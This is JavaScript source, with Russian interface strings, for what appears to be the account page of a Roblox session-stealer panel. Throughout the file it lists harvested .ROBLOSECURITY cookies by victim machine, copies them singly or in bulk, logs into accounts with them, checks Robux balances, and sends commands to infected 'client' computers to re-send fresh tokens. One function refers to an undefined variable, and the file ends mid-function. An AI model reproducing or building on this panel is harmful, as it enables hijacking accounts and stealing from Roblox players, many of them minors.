// ── Страница аккаунтов Roblox ────────────────────────────────────────────────
if (!requireLogin()) throw new Error('redirect');

document.getElementById('sidebarSlot').innerHTML = renderHeader('tokens');
bindLogout();

let allTokens = [];
let sortMode = 'date';
let currentFilter = 'all';
let searchQuery = '';
let viewMode = localStorage.getItem('ft_viewMode') || 'grid';
let currentExportFormat = 'cookie';
let selectedTokens = new Set();
let currentTagFileId = null;

const GAME_CATEGORIES = [
  { id: 'mm2', name: 'Murder Mystery 2', icon: '🔪', color: '#ef4444' },
  { id: 'adopt_me', name: 'Adopt Me', icon: '🐾', color: '#f59e0b' },
  { id: 'steal_brainrot', name: 'Steal a Brainrot', icon: '🧠', color: '#a855f7' }
];

// Close token dropdown menus when clicking outside
document.addEventListener('click', function(e) {
  if (!e.target.closest('.token-menu-wrap')) {
    document.querySelectorAll('.token-dropdown-menu').forEach(d => d.remove());
  }
});

async function loadTokens() {
  const container = document.getElementById('tokensContainer');
  const skeletonCard = `
    <div class="skeleton-card">
      <div class="skeleton-block" style="width:70px; height:70px; border-radius:50%; margin-top:0.5rem; margin-bottom:1.5rem;"></div>
      <div class="skeleton-block" style="width:120px; margin-bottom:1.5rem;"></div>
      <div class="skeleton-block" style="width:100%; height:45px; border-radius:12px; margin-bottom:0.5rem;"></div>
      <div class="skeleton-block" style="width:100%; height:35px; border-radius:8px; margin-bottom:0.5rem;"></div>
    </div>
  `;
  container.innerHTML = '<div class="tokens-grid">' + skeletonCard + skeletonCard + skeletonCard + skeletonCard + '</div>';
  try {
    const r = await apiFetch('/tokens-data');
    allTokens = await r.json();
    if (!Array.isArray(allTokens)) allTokens = [];

    // Sync old local logins to the server
    for (const t of allTokens) {
      if (!t.file) continue;
      const localVal = localStorage.getItem('login_' + t.file);
      if (localVal && !t.lastLogin) {
        apiFetch('/api/login-mark', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ filename: t.file, timestamp: parseInt(localVal) })
        }).catch(()=>{});
        t.lastLogin = parseInt(localVal);
      }
    }

    updateStats();
    renderTokens();
  } catch (e) {
    if (e.message !== 'auth') {
      container.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>Ошибка загрузки</div>';
      toast('Ошибка загрузки аккаунтов', 'err');
    }
  }
}

function updateStats() {
  const total = allTokens.length;
  const withRobux = allTokens.filter(t => t.robux && t.robux > 0).length;
  const totalRobux = allTokens.reduce((s, t) => s + (t.robux ? t.robux : 0), 0);

  document.getElementById('sTotal').textContent = total;
  document.getElementById('sValid').textContent = withRobux;
  document.getElementById('sTotalRobux').textContent = totalRobux.toLocaleString() + ' R$';

  const sbTok = document.getElementById('sbTokensCount');
  if (sbTok) sbTok.textContent = total.toLocaleString();
  const sbPcs = document.getElementById('sbPcsCount');
  if (sbPcs) {
    const pcsCount = new Set(allTokens.map(t => t.computer).filter(Boolean)).size;
    if (pcsCount > 0) sbPcs.textContent = pcsCount.toLocaleString();
  }

  // Update filter chip counters
  const cAll = document.getElementById('chipCountAll');
  const cRobux = document.getElementById('chipCountRobux');
  const cMM2 = document.getElementById('chipCountMM2');
  const cAdopt = document.getElementById('chipCountAdopt');
  const cBrain = document.getElementById('chipCountBrainrot');

  if (cAll) cAll.textContent = total;
  if (cRobux) cRobux.textContent = withRobux;
  if (cMM2) cMM2.textContent = allTokens.filter(t => (t.bookmarks || []).includes('mm2')).length;
  if (cAdopt) cAdopt.textContent = allTokens.filter(t => (t.bookmarks || []).includes('adopt_me')).length;
  if (cBrain) cBrain.textContent = allTokens.filter(t => (t.bookmarks || []).includes('steal_brainrot')).length;
}

// ── Фильтрация и поиск ────────────────────────────────────────────────────────
function handleTokenSearch() {
  const input = document.getElementById('tokenSearch');
  searchQuery = input ? input.value.trim().toLowerCase() : '';
  renderTokens();
}

function setFilter(filterId) {
  currentFilter = filterId;
  document.querySelectorAll('.filter-chip').forEach(chip => {
    if (chip.getAttribute('data-filter') === filterId) {
      chip.classList.add('active');
    } else {
      chip.classList.remove('active');
    }
  });
  renderTokens();
}

function setViewMode(mode) {
  viewMode = mode;
  localStorage.setItem('ft_viewMode', mode);

  const btnGrid = document.getElementById('btnViewGrid');
  const btnTable = document.getElementById('btnViewTable');
  if (btnGrid && btnTable) {
    if (mode === 'table') {
      btnTable.classList.add('active');
      btnGrid.classList.remove('active');
    } else {
      btnGrid.classList.add('active');
      btnTable.classList.remove('active');
    }
  }
  renderTokens();
}

// Initialize view mode buttons on load
if (viewMode === 'table') {
  const btnGrid = document.getElementById('btnViewGrid');
  const btnTable = document.getElementById('btnViewTable');
  if (btnGrid && btnTable) {
    btnTable.classList.add('active');
    btnGrid.classList.remove('active');
  }
}

function getFilteredTokens() {
  let list = [...allTokens];
  
  // URL filter ?file=
  const urlParams = new URLSearchParams(window.location.search);
  const filterFile = urlParams.get('file');
  if (filterFile) {
    list = list.filter(t => t.file === filterFile);
  }

  // Filter Chip logic
  if (currentFilter === 'robux') {
    list = list.filter(t => t.robux && t.robux > 0);
  } else if (currentFilter === 'mm2') {
    list = list.filter(t => (t.bookmarks || []).includes('mm2'));
  } else if (currentFilter === 'adopt_me') {
    list = list.filter(t => (t.bookmarks || []).includes('adopt_me'));
  } else if (currentFilter === 'steal_brainrot') {
    list = list.filter(t => (t.bookmarks || []).includes('steal_brainrot'));
  }

  // Search logic
  if (searchQuery) {
    list = list.filter(t => {
      const u = (t.username || '').toLowerCase();
      const id = String(t.userId || '');
      const c = (t.computer || '').toLowerCase();
      const f = (t.file || '').toLowerCase();
      const note = getAccountNote(t.file).toLowerCase();
      return u.includes(searchQuery) || id.includes(searchQuery) || c.includes(searchQuery) || f.includes(searchQuery) || note.includes(searchQuery);
    });
  }

  // Sorting logic
  if (sortMode === 'robux') {
    list.sort((a, b) => {
      const ar = a.robux || 0;
      const br = b.robux || 0;
      return br - ar;
    });
  } else if (sortMode === 'login') {
    list.sort((a, b) => {
      const loginA = parseInt(a.lastLogin || localStorage.getItem('login_' + (a.file || '')) || '0');
      const loginB = parseInt(b.lastLogin || localStorage.getItem('login_' + (b.file || '')) || '0');
      if (loginA !== loginB) return loginA - loginB;
      return new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0);
    });
  } else {
    list.sort((a, b) => new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0));
  }

  return list;
}

// ── Отрисовка аккаунтов ───────────────────────────────────────────────────────
function renderTokens() {
  const container = document.getElementById('tokensContainer');

  if (allTokens.length === 0) {
    container.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>База аккаунтов пуста</div>';
    return;
  }

  const list = getFilteredTokens();

  if (list.length === 0) {
    container.innerHTML = '<div class="empty"><span class="empty-icon">🔍</span>Ничего не найдено по вашему запросу</div>';
    return;
  }

  // Render view
  if (viewMode === 'table') {
    renderTokensTable(list, container);
  } else {
    renderTokensGrid(list, container);
  }

  updateBulkActionBar();
}

// ── Вид: Сетка (Cards) ────────────────────────────────────────────────────────
function renderTokensGrid(list, container) {
  let html = '<div class="tokens-grid">';

  for (const t of list) {
    const tokenFull = escapeHtml(t.security || '');
    const fileId = escapeHtml(t.file || '');
    const isSelected = selectedTokens.has(t.file);
    const note = getAccountNote(t.file);

    html += '<div class="token-card ' + (isSelected ? 'selected' : '') + '" data-file="' + fileId + '">';
    
    // Checkbox in top-left for batch select
    html += '<div class="token-card-select-wrap">' +
      '<input type="checkbox" class="token-select-check" ' + (isSelected ? 'checked' : '') + ' onchange="toggleSelectToken(\'' + fileId.replace(/'/g, "\\'") + '\', this.checked)" title="Выбрать аккаунт">' +
      '</div>';

    // Robux pill in top-right
    if (t.robux !== undefined && t.robux > 0) {
      html += '<div class="token-card-robux">' + t.robux.toLocaleString() + ' R$</div>';
    } else {
      html += '<div class="token-card-robux zero">0 R$</div>';
    }
    
    // Avatar
    let avatarHtml = '<div class="token-card-avatar"><svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" style="color:var(--text-muted);"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></div>';
    if (t.userId) {
      avatarHtml = '<div class="token-card-avatar" style="padding:0; overflow:hidden;"><img src="' + API_BASE + '/avatar-proxy/' + t.userId + '" style="width:100%; height:100%; object-fit:cover;" onerror="this.outerHTML=\\\'👤\\\'"></div>';
    }
    html += avatarHtml;

    // Username
    html += '<div class="token-card-name">' + escapeHtml(t.username || '—') + '</div>';

    // Clickable Roblox Profile Link (User ID)
    if (t.userId) {
      html += '<a href="https://www.roblox.com/users/' + t.userId + '/profile" target="_blank" rel="noopener" class="token-card-userid" title="Открыть официальный профиль в Roblox">ID: ' + t.userId + ' <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></a>';
    }

    // Computer / Worker
    html += '<div class="token-card-computer">💻 ' + escapeHtml(t.computer || '—') + '</div>';

    // Account Note Badge (if set)
    const noteStyle = note ? 'display:inline-flex;' : 'display:none;';
    html += '<div class="token-card-note" onclick="openTagModal(\'' + fileId.replace(/'/g, "\\'") + '\')" title="Нажмите, чтобы изменить заметку" style="' + noteStyle + '">📝 ' + escapeHtml(note) + '</div>';
    
    // Game Tag Badges Row
    const bookmarks = t.bookmarks || [];
    html += '<div class="bookmark-badges">';
    for (const bm of bookmarks) {
      const bmCat = GAME_CATEGORIES.find(c => c.id === bm);
      if (bmCat) {
        html += '<span class="bookmark-badge" onclick="openTagModal(\'' + fileId.replace(/'/g, "\\'") + '\')" style="background:' + bmCat.color + '15; color:' + bmCat.color + '; border-color:' + bmCat.color + '30; cursor:pointer;" title="Нажмите, чтобы изменить пометки">' + bmCat.icon + ' ' + bmCat.name + '</span>';
      }
    }
    html += '<button class="btn-add-tag" onclick="openTagModal(\'' + fileId.replace(/'/g, "\\'") + '\')" title="Настроить пометки">+ Пометка</button>';
    html += '</div>';
    
    // Actions
    html += '<div class="token-card-actions">';
    
    let loginBtnText = 'Войти';
    let loginClass = 'btn-login';
    const lastLogin = t.lastLogin || localStorage.getItem('login_' + fileId);
    if (lastLogin) {
      const d = new Date(parseInt(lastLogin));
      loginBtnText = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
      loginClass = 'btn-login logged-in';
    }
    
    if (t.security) {
      html += '<div style="display:flex; gap:6px; align-items:center; width: 100%;">';
      html += '<button class="' + loginClass + '" style="flex:1;" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')">' + loginBtnText + '</button>';
      html += '<button class="btn-copy-token" title="Скопировать токен .ROBLOSECURITY" onclick="copyTokenCookie(\'' + tokenFull.replace(/'/g, "\\'") + '\')"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg></button>';
      html += '<div class="token-menu-wrap" style="position:relative;">';
      html += '<button class="btn-secondary token-menu-btn" onclick="toggleTokenMenu(event, \'' + fileId.replace(/'/g, "\\'") + '\')">⋮</button>';
      html += '</div>';
      html += '</div>';
    }
    
    html += '</div></div>';
  }

  html += '</div>';
  container.innerHTML = html;
}

// ── Вид: Таблица (Dense Table View) ───────────────────────────────────────────
function renderTokensTable(list, container) {
  const allFiltered = getFilteredTokens();
  const allSelected = allFiltered.length > 0 && allFiltered.every(t => selectedTokens.has(t.file));

  let html = '<div class="tokens-table-wrapper">';
  html += '<table class="tokens-table">';
  html += '<thead><tr>';
  html += '<th style="width: 36px; text-align: center;"><input type="checkbox" class="token-select-check" ' + (allSelected ? 'checked' : '') + ' onchange="toggleSelectAll(this.checked)" title="Выбрать все"></th>';
  html += '<th>Игрок</th>';
  html += '<th>Баланс Robux</th>';
  html += '<th>Пометки</th>';
  html += '<th>Воркер (ПК)</th>';
  html += '<th>Посещение</th>';
  html += '<th style="text-align:right;">Действия</th>';
  html += '</tr></thead><tbody>';

  for (const t of list) {
    const tokenFull = escapeHtml(t.security || '');
    const fileId = escapeHtml(t.file || '');
    const isSelected = selectedTokens.has(t.file);
    const note = getAccountNote(t.file);
    
    let avatarImg = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="color:var(--text-muted);"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>';
    if (t.userId) {
      avatarImg = '<img src="' + API_BASE + '/avatar-proxy/' + t.userId + '" alt="" onerror="this.outerHTML=\\\'👤\\\'">';
    }

    const robuxVal = t.robux || 0;
    const robuxClass = robuxVal > 0 ? 'table-robux' : 'table-robux zero';

    // Game tags + Add button
    let gamesHtml = '<div style="display:flex; gap:4px; flex-wrap:wrap; align-items:center;">';
    const bookmarks = t.bookmarks || [];
    for (const bm of bookmarks) {
      const bmCat = GAME_CATEGORIES.find(c => c.id === bm);
      if (bmCat) {
        gamesHtml += '<span class="bookmark-badge" onclick="openTagModal(\'' + fileId.replace(/'/g, "\\'") + '\')" style="background:' + bmCat.color + '15; color:' + bmCat.color + '; border-color:' + bmCat.color + '30; cursor:pointer;" title="Нажмите, чтобы изменить">' + bmCat.icon + ' ' + bmCat.name + '</span>';
      }
    }
    gamesHtml += '<button class="btn-add-tag" onclick="openTagModal(\'' + fileId.replace(/'/g, "\\'") + '\')" title="Настроить пометки">+ Пометка</button>';
    gamesHtml += '</div>';

    // Last login
    const lastLogin = t.lastLogin || localStorage.getItem('login_' + fileId);
    let loginStr = '<span style="color:var(--text-muted); font-size:0.75rem;">Не заходил</span>';
    if (lastLogin) {
      const d = new Date(parseInt(lastLogin));
      loginStr = '<span style="font-size:0.78rem; color:var(--text-secondary);">' + d.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString() + '</span>';
    }

    // Profile link
    let userSubHtml = '';
    if (t.userId) {
      userSubHtml = '<a href="https://www.roblox.com/users/' + t.userId + '/profile" target="_blank" rel="noopener" class="token-card-userid" style="display:inline-flex; margin-top:2px;">ID: ' + t.userId + ' ↗</a>';
    }
    if (note) {
      userSubHtml += '<span class="token-card-note" onclick="openTagModal(\'' + fileId.replace(/'/g, "\\'") + '\')" style="display:inline-flex; margin-left:6px; cursor:pointer;">📝 ' + escapeHtml(note) + '</span>';
    }

    html += '<tr class="' + (isSelected ? 'selected' : '') + '" data-file="' + fileId + '">' +
      '<td style="text-align: center;">' +
        '<input type="checkbox" class="token-select-check" ' + (isSelected ? 'checked' : '') + ' onchange="toggleSelectToken(\'' + fileId.replace(/'/g, "\\'") + '\', this.checked)">' +
      '</td>' +
      '<td>' +
        '<div class="table-user">' +
          '<div class="table-avatar">' + avatarImg + '</div>' +
          '<div>' +
            '<div class="table-name">' + escapeHtml(t.username || '—') + '</div>' +
            '<div class="table-id">' + userSubHtml + '</div>' +
          '</div>' +
        '</div>' +
      '</td>' +
      '<td>' +
        '<span class="' + robuxClass + '">' + robuxVal.toLocaleString() + ' R$</span>' +
      '</td>' +
      '<td>' + gamesHtml + '</td>' +
      '<td>' +
        '<span style="font-family:\'JetBrains Mono\',monospace; font-size:0.76rem; color:var(--text-secondary);">💻 ' + escapeHtml(t.computer || '—') + '</span>' +
      '</td>' +
      '<td>' + loginStr + '</td>' +
      '<td>' +
        '<div class="table-actions" style="justify-content: flex-end;">' +
          '<button class="btn-login" style="padding: 5px 10px; font-size: 0.75rem;" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')">Войти</button>' +
          '<button class="btn-copy-token" title="Скопировать .ROBLOSECURITY" onclick="copyTokenCookie(\'' + tokenFull.replace(/'/g, "\\'") + '\')"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg></button>' +
          '<div class="token-menu-wrap" style="position:relative;">' +
            '<button class="btn-secondary token-menu-btn" style="padding: 5px 8px;" onclick="toggleTokenMenu(event, \'' + fileId.replace(/'/g, "\\'") + '\')">⋮</button>' +
          '</div>' +
        '</div>' +
      '</td>' +
    '</tr>';
  }

  html += '</tbody></table></div>';
  container.innerHTML = html;
}

// ── Массовые действия (Bulk Selection) ─────────────────────────────────────────
function toggleSelectToken(fileId, isChecked) {
  if (isChecked) {
    selectedTokens.add(fileId);
  } else {
    selectedTokens.delete(fileId);
  }
  updateBulkActionBar();
  updateCardSelectionUI(fileId, isChecked);
}

function updateCardSelectionUI(fileId, isChecked) {
  document.querySelectorAll('[data-file="' + fileId + '"]').forEach(el => {
    if (el.classList.contains('token-card') || el.tagName === 'TR') {
      if (isChecked) el.classList.add('selected');
      else el.classList.remove('selected');
    }
    const chk = el.querySelector('.token-select-check');
    if (chk) chk.checked = isChecked;
  });
}

function toggleSelectAll(isChecked) {
  const currentList = getFilteredTokens();
  if (isChecked) {
    currentList.forEach(t => selectedTokens.add(t.file));
  } else {
    selectedTokens.clear();
  }
  updateBulkActionBar();
  renderTokens();
}

function clearSelection() {
  selectedTokens.clear();
  updateBulkActionBar();
  document.querySelectorAll('.token-card.selected, tr.selected').forEach(c => c.classList.remove('selected'));
  document.querySelectorAll('.token-select-check').forEach(chk => chk.checked = false);
}

function updateBulkActionBar() {
  const bar = document.getElementById('bulkActionBar');
  const countEl = document.getElementById('bulkSelectedCount');
  const selectAll = document.getElementById('bulkSelectAllCheck');
  if (!bar) return;

  const count = selectedTokens.size;
  if (count > 0) {
    bar.style.display = 'flex';
    if (countEl) countEl.textContent = 'Выбрано: ' + count;
    const filtered = getFilteredTokens();
    if (selectAll) selectAll.checked = (count === filtered.length && filtered.length > 0);
  } else {
    bar.style.display = 'none';
    if (selectAll) selectAll.checked = false;
  }
}

function bulkCopyCookies() {
  if (selectedTokens.size === 0) return;
  const cookies = [];
  allTokens.forEach(t => {
    if (selectedTokens.has(t.file) && t.security) {
      cookies.push(t.security);
    }
  });
  if (cookies.length === 0) {
    toast('У выбранных аккаунтов нет валидных токенов', 'err');
    return;
  }
  copyText(cookies.join('\n'));
  toast('📋 Скопировано токенов: ' + cookies.length);
}

async function bulkDeleteSelected() {
  const count = selectedTokens.size;
  if (count === 0) return;
  if (!confirm('Удалить выбранные аккаунты (' + count + ' шт.) из базы? Это действие необратимо.')) return;

  let deleted = 0;
  const filesToDelete = Array.from(selectedTokens);
  for (const f of filesToDelete) {
    try {
      const r = await apiFetch('/files/' + encodeURIComponent(f), { method: 'DELETE' });
      if (r.ok) deleted++;
    } catch (_) {}
  }
  selectedTokens.clear();
  updateBulkActionBar();
  toast('🗑️ Удалено аккаунтов: ' + deleted);
  loadTokens();
}

// ── Массовая пометка (Bulk Tag Modal) ──────────────────────────────────────────
function openBulkTagModal() {
  if (selectedTokens.size === 0) {
    toast('Сначала выберите аккаунты', 'err');
    return;
  }
  const modal = document.getElementById('bulkTagModal');
  const countLbl = document.getElementById('bulkTagModalCount');
  const listEl = document.getElementById('bulkTagModalList');
  if (!modal) return;

  countLbl.textContent = 'Выбрано аккаунтов: ' + selectedTokens.size + '. Выберите метку:';

  let html = '';
  for (const cat of GAME_CATEGORIES) {
    html += '<div style="display:flex; justify-content:space-between; align-items:center; background:var(--surface); border:1px solid var(--border); padding:10px 14px; border-radius:var(--radius-sm); margin-bottom:8px;">' +
      '<div style="display:flex; align-items:center; gap:8px; font-weight:600; color:#fff;">' +
        '<span style="font-size:1.3rem;">' + cat.icon + '</span> ' + escapeHtml(cat.name) +
      '</div>' +
      '<div style="display:flex; gap:6px;">' +
        '<button class="btn-primary" style="padding:5px 12px; font-size:0.75rem;" onclick="bulkApplyTag(\'' + cat.id + '\', true)">+ Пометить</button>' +
        '<button class="btn-secondary" style="padding:5px 10px; font-size:0.75rem;" onclick="bulkApplyTag(\'' + cat.id + '\', false)">Снять</button>' +
      '</div>' +
    '</div>';
  }
  listEl.innerHTML = html;
  modal.classList.add('open');
}

function closeBulkTagModal() {
  const modal = document.getElementById('bulkTagModal');
  if (modal) modal.classList.remove('open');
}

async function bulkApplyTag(gameId, isAdd) {
  const files = Array.from(selectedTokens);
  let changed = 0;
  for (const fileId of files) {
    const token = allTokens.find(t => t.file === fileId);
    if (!token) continue;
    const hasTag = (token.bookmarks || []).includes(gameId);
    if ((isAdd && !hasTag) || (!isAdd && hasTag)) {
      try {
        const r = await apiFetch('/api/bookmark', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ filename: fileId, game: gameId })
        });
        const data = await r.json();
        token.bookmarks = data.bookmarks || [];
        changed++;
      } catch(_) {}
    }
  }
  updateStats();
  renderTokens();
  closeBulkTagModal();
  toast('🏷️ Обновлено меток у ' + changed + ' аккаунтов');
}

// ── Индивидуальное окно пометок и заметок (Tag & Notes Modal) ──────────────────
function getAccountNote(fileId) {
  return localStorage.getItem('ft_note_' + fileId) || '';
}

function setAccountNote(fileId, note) {
  if (!note || !note.trim()) {
    localStorage.removeItem('ft_note_' + fileId);
  } else {
    localStorage.setItem('ft_note_' + fileId, note.trim());
  }
}

function openTagModal(fileId) {
  currentTagFileId = fileId;
  const token = allTokens.find(t => t.file === fileId);
  if (!token) return;

  const modal = document.getElementById('tagModal');
  if (!modal) return;

  document.getElementById('tagModalTitle').textContent = token.username || 'Аккаунт';
  const sub = [];
  if (token.userId) sub.push('ID: ' + token.userId);
  if (token.computer) sub.push('ПК: ' + token.computer);
  document.getElementById('tagModalSubtitle').textContent = sub.join(' • ') || 'Настройка меток и заметки';

  // Avatar
  const avEl = document.getElementById('tagModalAvatar');
  if (token.userId) {
    avEl.innerHTML = '<img src="' + API_BASE + '/avatar-proxy/' + token.userId + '" style="width:100%; height:100%; object-fit:cover;" onerror="this.outerHTML=\\\'👤\\\'">';
  } else {
    avEl.innerHTML = '👤';
  }

  // Note
  const noteInput = document.getElementById('tagModalNote');
  if (noteInput) noteInput.value = getAccountNote(fileId);

  renderModalGameToggles();
  modal.classList.add('open');
}

function closeTagModal() {
  const modal = document.getElementById('tagModal');
  if (modal) modal.classList.remove('open');
  currentTagFileId = null;
}

function renderModalGameToggles() {
  const container = document.getElementById('tagModalGames');
  if (!container || !currentTagFileId) return;

  const token = allTokens.find(t => t.file === currentTagFileId);
  const bookmarks = (token && token.bookmarks) ? token.bookmarks : [];

  let html = '';
  for (const cat of GAME_CATEGORIES) {
    const isChecked = bookmarks.includes(cat.id);
    html += '<div class="game-tag-toggle ' + (isChecked ? 'active' : '') + '" onclick="toggleModalTag(\'' + cat.id + '\')" style="--tag-color:' + cat.color + ';">' +
      '<div class="game-tag-left">' +
        '<span class="game-tag-icon">' + cat.icon + '</span>' +
        '<span class="game-tag-name">' + escapeHtml(cat.name) + '</span>' +
      '</div>' +
      '<div class="game-tag-badge-status">' + (isChecked ? '✓ Помечено' : '+ Добавить') + '</div>' +
    '</div>';
  }
  container.innerHTML = html;
}

async function toggleModalTag(gameId) {
  if (!currentTagFileId) return;
  const token = allTokens.find(t => t.file === currentTagFileId);
  if (!token) return;

  try {
    const r = await apiFetch('/api/bookmark', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filename: currentTagFileId, game: gameId })
    });
    const data = await r.json();
    token.bookmarks = data.bookmarks || [];
    
    // Smooth update of the modal UI
    renderModalGameToggles();
    // Smooth update of card / row badges in background
    updateCardTagsUI(currentTagFileId, token.bookmarks);
    updateStats();

    const cat = GAME_CATEGORIES.find(c => c.id === gameId);
    const catName = cat ? cat.name : gameId;
    if (token.bookmarks.includes(gameId)) {
      toast('🏷️ Добавлена пометка: ' + catName);
    } else {
      toast('🏷️ Снята пометка: ' + catName);
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка сохранения пометки', 'err');
  }
}

function saveTagModalNote() {
  if (!currentTagFileId) return;
  const input = document.getElementById('tagModalNote');
  const val = input ? input.value : '';
  setAccountNote(currentTagFileId, val);
  updateCardNoteUI(currentTagFileId, val);
  toast('📝 Заметка сохранена');
}

function updateCardNoteUI(fileId, note) {
  document.querySelectorAll('[data-file="' + fileId + '"]').forEach(el => {
    const noteEl = el.querySelector('.token-card-note');
    if (note && note.trim()) {
      if (noteEl) {
        noteEl.textContent = '📝 ' + note.trim();
        noteEl.style.display = 'inline-flex';
      }
    } else {
      if (noteEl) noteEl.style.display = 'none';
    }
  });
}

function updateCardTagsUI(fileId, bookmarks) {
  document.querySelectorAll('[data-file="' + fileId + '"]').forEach(el => {
    const badgesContainer = el.querySelector('.bookmark-badges');
    if (badgesContainer) {
      let html = '';
      for (const bm of bookmarks) {
        const cat = GAME_CATEGORIES.find(c => c.id === bm);
        if (cat) {
          html += '<span class="bookmark-badge" onclick="openTagModal(\'' + fileId.replace(/'/g, "\\'") + '\')" style="background:' + bmCat.color + '15; color:' + bmCat.color + '; border-color:' + bmCat.color + '30; cursor:pointer;" title="Нажмите, чтобы изменить">' + bmCat.icon + ' ' + bmCat.name + '</span>';
        }
      }
      html += '<button class="btn-add-tag" onclick="openTagModal(\'' + fileId.replace(/'/g, "\\'") + '\')" title="Настроить пометки">+ Пометка</button>';
      badgesContainer.innerHTML = html;
    }
  });
}

// ── Быстрое копирование Cookie ────────────────────────────────────────────────
function copyTokenCookie(token) {
  if (!token) {
    toast('Токен пуст', 'err');
    return;
  }
  copyText(token);
  toast('📋 Cookie скопирован в буфер!');
}

// ── Проверить все токены ─────────────────────────────────────────────────────
document.getElementById('btnCheckAll').addEventListener('click', async function() {
  const btn = this;
  btn.disabled = true;
  const originalHtml = btn.innerHTML;
  btn.innerHTML = '<span style="font-size: 1rem;">⏳</span> Проверка...';
  try {
    const r = await apiFetch('/robux-bulk', { method: 'POST' });
    const data = await r.json();
    const results = Array.isArray(data) ? data : (data.tokens || []);
    const deletedCount = data.deletedCount || 0;
    allTokens = results;
    updateStats();
    renderTokens();
    const valid = results.filter(r => r.valid).length;
    if (deletedCount > 0) {
      toast('✅ Балансы обновлены. Удалено нерабочих: ' + deletedCount);
    } else {
      toast('✅ Балансы обновлены (' + valid + ' аккаунтов)');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка проверки балансов', 'err');
  }
  btn.disabled = false;
  btn.innerHTML = originalHtml;
});

// ── Запросить все токены ─────────────────────────────────────────────────────
document.getElementById('btnRequestAll')?.addEventListener('click', async function() {
  const btn = this;
  if (!confirm('Отправить команду всем клиентам на принудительное обновление токенов? (Компьютеры должны быть включены)')) return;
  const originalHtml = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '<span style="font-size: 1rem;">⏳</span> Запрос...';
  try {
    await apiFetch('/request-token-all', { method: 'POST' });
    toast('✅ Запрос на обновление отправлен всем клиентам!');
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка отправки запроса', 'err');
  }
  btn.disabled = false;
  btn.innerHTML = originalHtml;
});

// ── Запросить один токен ─────────────────────────────────────────────────────
async function requestToken(filename) {
  if (!confirm('Отправить команду на принудительное обновление токена для этого клиента?')) return;
  try {
    const r = await apiFetch('/request-token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filename })
    });
    if (r.ok) {
      toast('✅ Запрос на обновление токена отправлен!');
    } else {
      toast('❌ Ошибка при отправке запроса', 'err');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка соединения', 'err');
  }
}

// ── Копирование ───────────────────────────────────────────────────────────────
function copyText(text) {
  if (!text) return;
  navigator.clipboard.writeText(text).then(() => {}).catch(() => {
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
  });
}

// ── Вход в Roblox по токену ───────────────────────────────────────────────────
function loginToRoblox(token, btn, fileId) {
  if (!token) return;
  btn.textContent = '⏳...';
  btn.disabled = true;

  function handler(e) {
    if (e.data && e.data.type === 'nexus-login-response') {
      window.removeEventListener('message', handler);
      if (e.data.ok) {
        if (fileId) {
          apiFetch('/api/login-mark', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ filename: fileId })
          }).catch(()=>{});
          const tokenData = allTokens.find(t => t.file === fileId);
          if (tokenData) tokenData.lastLogin = Date.now();
        }
        const d = new Date();
        btn.textContent = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
        btn.className = 'btn-login logged-in';
        btn.disabled = false;
        toast('✅ Вход выполнен, открываем Roblox...');
      } else {
        restoreBtnText();
        toast('⚠️ Установите расширение NEXUS для авторизации', 'err');
      }
    }
  }

  function restoreBtnText() {
    const tokenData = allTokens.find(t => t.file === fileId);
    const lastLogin = (tokenData && tokenData.lastLogin) ? tokenData.lastLogin : (fileId ? localStorage.getItem('login_' + fileId) : null);
    if (lastLogin) {
      const d = new Date(parseInt(lastLogin));
      btn.textContent = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
      btn.className = 'btn-login logged-in';
    } else {
      btn.textContent = 'Войти';
      btn.className = 'btn-login';
    }
    btn.disabled = false;
  }

